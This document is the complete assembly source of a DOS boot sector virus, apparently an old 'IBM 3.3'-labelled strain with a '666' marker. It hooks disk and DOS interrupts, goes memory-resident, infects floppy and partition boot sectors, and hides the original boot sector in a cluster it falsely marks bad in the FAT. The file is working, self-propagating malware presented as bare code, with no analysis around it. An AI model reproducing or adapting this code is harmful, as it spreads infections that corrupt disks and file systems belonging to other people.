	.radix	16
start:
	jmp	begin

	db	'IBM  3.3'
	dw	200
	db	2
	dw	1
	db	2
	dw	70
	dw	2D0
	db	0FDh
	dw	2
	dw	9
	dw	2
	dw	0

work	dd	?
count	db	?
drive	db	?
Fat_sec dw	?
old_boot	dw 666d
flag		db ?
sys_sec dw ?

;Simulate PUSHA

pusha:
	pop	word ptr cs:[sys_sec-start]
	pushf
	push	ax
	push	bx
	push	cx
	push	dx
	push	si
	push	di
	push	bp
	push	ds
	push	es
	jmp	word ptr cs:[sys_sec-start]

;Simulate POPA

popa:
	pop	word ptr cs:[sys_sec-start]
	pop	es
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	popf
	jmp	word ptr cs:[sys_sec-start]

;This procedure Reads/Writes the absolute sector in BX
;ES:BP must point I/O buffer

write:
	mov	ah,3
	jmp	short do_it
read:
	mov	ah,2
do_it:
	mov	al,1
	xchg	ax,bx
	add	ax,[001C]	;Hidden sectors
	xor	dx,dx
	div	word ptr [0018]
	inc	dl	;Adjust dl because BIOS counts sectors from 1 (not from 0)
	mov	ch,dl	;dl is the first sector
	xor	dx,dx
	div	word ptr [001A] ;Cylinder  in AX
	mov	cl,6		;Set CX if cylinder is bigger than 512
	shl	ah,cl
	or	ah,ch
	xchg	ax,cx
	xchg	ch,cl
	xchg	dh,dl
	xchg	ax,bx

abs_read:
	xchg	bx,bp
	mov	dl,byte ptr [drive-start] ;dl is the drive
	pushf
	db	9A
orig	dd	?
	jnc	ok_func
	pop	ax
ok_func:
	ret


begin:
	xor	ax,ax	;Virus begining
	mov	bp,7C00
	mov	ds,ax	;Clear ds&ss
	mov	ss,ax
	mov	sp,bp	;Set SP bellow virus
	xchg	ax,di
	mov	si,bp
	mov	ax,2000 ;Copy virus somewhere in memory
	mov	es,ax
	mov	cx,0100
	rep	movsw
	push	es
	mov	ax,offset here-start
	push	ax
	retf	;go there


here:
	mov	ax,1234
	cmp	[80*4],ax
	mov	[80*4],ax
	je	skip_this
	les	bx,[1C*4]		;Get old int 1Ch value
	mov	cs:[work-start],bx
	mov	cs:[work-start+2],es
	mov	[1C*4],offset entry_1C-start	;Set new value
	mov	[1C*4+2],cs

skip_this:

	les	bx,[13*4]		;Save original int 13h
	mov	cs:[orig-start],bx
	mov	cs:[orig-start+2],es
	push	cs	;DS=ES=CS
	push	cs
	pop	ds
	pop	es
again:
	mov	ax,offset again-start
	push	ax
	xor	ah,ah		;Initialize Floppy
	mov	byte ptr [flag-start],ah
	int	13
	and	byte ptr [drive-start],80	;Drive A: or C:
	mov	bx,word ptr [old_boot-start]	;Read second part
	mov	bp,offset second-start
	call	read
	mov	bx,word ptr [old_boot-start]
	inc	bx
	xor	ax,ax
	mov	es,ax
	mov	bp,7C00
	call	read		;Read old Boot
	db	0EA,00,7C,00,00 ;JMP 0000:7C00

entry_1C:
	push	si
	push	ds

	xor	si,si
	mov	ds,si
	cmp	[si+21*4],si
	je	not_yet

	push	bx
	push	es

	les	bx,cs:[si+work-start]
	mov	[si+1C*4],bx
	mov	[si+1C*4+2],es
	les	bx,[si+21*4]
	mov	word ptr cs:[si+jmp_21-start],bx
	mov	word ptr cs:[si+jmp_21-start+2],es
	mov	[si+21*4],offset go_on-start
	mov	[si+21*4+2],cs

	pop	es
	pop	bx

not_yet:
	pop	ds
	pop	si
	iret

go_on:
	call	pusha
	cmp	ax,4B00
	je	install
return:
	call	popa

	db	0EA
jmp_21	dd	?

install:

	mov	ah,52
	int	21
	xor	si,si
	xor	di,di
	mov	ds,es:[bx-02]
	mov	bx,ds
	mov	ax,[si+3]
	add	[si+3],96
	inc	bx
	add	ax,bx
	mov	es,ax
	push	es
	mov	ax,es:[si+3]
	sub	ax,96
	push	ax
	mov	ax,[si+3]
	add	ax,bx
	mov	ds,ax
	mov	byte ptr [si],'Z'
	mov	[si+1],si
	pop	[si+3]
	pop	es
	push	cs
	pop	ds
	mov	cx,0200
	rep	movsw
	mov	ax,word ptr [jmp_21-start]
	mov	bx,word ptr [jmp_21-start+2]
	mov	ds,cx
	mov	[21*4],ax
	mov	[21*4+2],bx
	mov	ax,[13*4]
	mov	bx,[13*4+2]
	mov	es:[my-start],ax
	mov	es:[my-start+2],bx
	mov	[13*4],offset real-start
	mov	[13*4+2],es
	jmp	short return


real:
	call	pusha
	cmp	ah,02
	jne	exit
	cmp	dl,81
	ja	exit
	mov	byte ptr cs:[drive-start],dl
check:
	xor	ax,ax
	mov	ds,ax
	mov	byte ptr cs:[flag-start],al
	mov	al,byte ptr [043F]
	push	dx
	test	dl,80
	jz	ok_drive
	sub	dl,7F
	shl	dx,1
	shl	dx,1
	dec	dx
ok_drive:
	inc	dx
	test	al,dl
	pop	dx
	jnz	exit
	push	cs
	push	cs
	pop	es
	pop	ds
	call	infect
exit:
	call	popa
call_cur:
	db	0EA
my	dd	?

ident	dw	01234
	dw	0AA55

	second	label word

	db	'666'

infect:
	push	dx
	xor	ah,ah
	int	1A
	test	dl,01
	pop	dx
	jz	bad
	mov	ax,0201
	mov	dh,0
	mov	cx,0001
	mov	bp,offset buffer-start
	call	abs_read
	test	dl,80
	jz	usual
	mov	bx,offset buffer-start+01BE
	mov	cx,0004
search:
	cmp	byte ptr [bx+4],1
	je	okay
	cmp	byte ptr [bx+4],4
	je	okay
	add	bx,10
	loop	search
	ret

okay:
	mov	dx,[bx]
	mov	cx,[bx+2]
	mov	ax,0201
	mov	bp,offset buffer-start
	call	abs_read
usual:
	mov	si,offset buffer-start+3
	mov	di,0003
	mov	cx,1Bh
	rep	movsb
	cmp	[buffer-start+01FC],1234	;Infected ?
	jne	well
bad:
	ret

well:
	cmp	[0Bh],200				;Bytes in sector
	jne	bad
	cmp	byte ptr [0Dh],2			;Sectors in 1 cluster
	jb	bad
	mov	cx,[0E] ;Reserved dectors
	mov	al,[10] ;Copies of FAT
	cbw
	mul	word ptr [16]				;FAT in sectors
	add	cx,ax
	mov	ax,20					;32 bytes
	mul	word ptr [11]				;Elements in the catalogue
	mov	bx,1FF
	add	ax,bx
	inc	bx
	div	bx
	add	cx,ax
	mov	word ptr [sys_sec-start],cx		;system sectors
	mov	ax,[0013]				;Sectors on the disk
	sub	ax,cx
	mov	bl,[0Dh]				;Sectors in cluster
	xor	dx,dx
	xor	bh,bh
	div	bx
	inc	ax					;AX=clusters on disk
	mov	di,ax
	and	byte ptr [flag-start],0FE
	cmp	ax,0FF0
	jbe	small
	or	byte ptr [flag-start],1
small:
	mov	si,1
	mov	bx,[0E] ;Where to read FAT from
	dec	bx
	mov	[Fat_sec-start],bx
	mov	byte ptr [count-start],0FE

look_here:

	inc	word ptr [Fat_sec-start]	;Next sector in FAT
	mov	bx,[Fat_sec-start]
	add	byte ptr [count-start],2	;Adjust for new offset
	mov	bp,offset buffer-start		;BP points buffer
	call	read				;Read FAT's sector
	jmp	short where

look:
	mov	ax,3	;Multiply by 1.5 rounded down to integer number
	test	byte ptr [flag-start],1
	je	go_1
	inc	ax	;For 16 bit FAT
go_1:
	mul	si
	shr	ax,1
	sub	ah,byte ptr [count-start] ;Adjust offset in range of 512 bytes
	mov	bx,ax
	cmp	bx,1FF	;If reached the end then load next FAT sector
	jnb	look_here
	mov	dx,[bx+buffer-start]	;Information for this cluster
	test	byte ptr [flag-start],01
	jne	go_2
	test	si,1
	je	go_3
	mov	cl,4
	shr	dx,cl
go_3:
	and	dh,0F
go_2:
	or	dx,dx		;Free cluster ?
	jz	found
where:
	inc	si
	cmp	si,di
	jbe	look
	ret

found:
	mov	dx,0FFF7	;Prepare for marking it as bad
	test	byte ptr [flag-start],1
	jnz	go_4
	and	dh,0F
	test	si,1
	je	go_4
	mov	cl,4
	shl	dx,cl
go_4:
	or	[bx+buffer-start],dx	;Set it in FAT
	mov	bx,[Fat_sec-start]
	mov	bp,offset buffer-start
	call	write	;Update 1'st FAT copy
	mov	ax,si	;Convert cluster address in si to sector number
	sub	ax,2
	mov	bl,byte ptr [0Dh]
	xor	bh,bh
	mul	bx
	add	ax,[sys_sec-start]
	mov	si,ax	;Si is the sector that is free
	xor	bx,bx
	mov	bp,offset buffer-start
	call	read	;Read old BOOTSECTOR
	mov	bx,si	;Put it in a quiet place
	inc	bx
	mov	bp,offset buffer-start
	call	write	;Do that
	mov	bx,si
	mov	[old_boot-start],si
	mov	bp,offset second-start
	call	write
	xor	bx,bx
	xor	bp,bp
	call	write
	ret

this_		db	1024d-(this_-start) dup (0F6h)

	buffer label word


